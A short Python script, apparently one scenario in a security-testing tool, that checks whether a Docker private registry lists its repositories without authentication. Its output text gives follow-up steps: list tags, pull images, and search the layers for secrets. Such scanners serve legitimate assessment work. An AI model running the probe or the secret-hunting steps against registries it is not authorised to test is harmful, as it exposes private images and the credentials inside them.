
import requests

def run(target_url: str) -> dict:
    """
    Scenario 7: Attacking private registry
    """
    target = target_url.rstrip('/')
    
    is_vulnerable = False
    details = ""

    try:
        # Step from Report: 
        # curl http://127.0.0.1:1235/v2/
        # curl http://127.0.0.1:1235/v2/_catalog
        
        catalog_url = f"{target}/v2/_catalog"
        r = requests.get(catalog_url, timeout=5)
        
        # Success if we can list repositories or if we see the Docker registry header
        if r.status_code == 200 and "repositories" in r.text:
             is_vulnerable = True
             details = "Successfully accessed Private Registry Catalog (Unauthenticated)."
             evidence = f"Repositories: {r.text}"
        elif r.status_code == 401 and "Docker-Distribution-Api-Version" in r.headers:
             is_vulnerable = True
             details = "Registry exposed but requires auth (Private)."
             evidence = "Header: Docker-Distribution-Api-Version detected."

    except:
        pass

    if is_vulnerable:
        return {
            "success": True,
            "output": f"""[+] VULNERABILITY DETECTED: Private Registry Exposure
Target: {target}
[VERIFIED] Registry is accessible!
Details: {details}
Evidence: {evidence}

[How to Exploit (Detailed Steps Executed)]
1. Sent GET request to `/v2/_catalog`.
2. Verified response contains 'repositories' list.

[Next Steps from Report]
1. List tags: `curl {target}/v2/<repo_name>/tags/list`
2. Pull image: `docker pull localhost:1235/<repo_name>:<tag>`
3. Inspect layers for secrets: `grep -i env` in manifest.
"""
        }
    else:
        return {"success": False, "output": f"[-] Target {target} catalog not accessible or not a registry."}
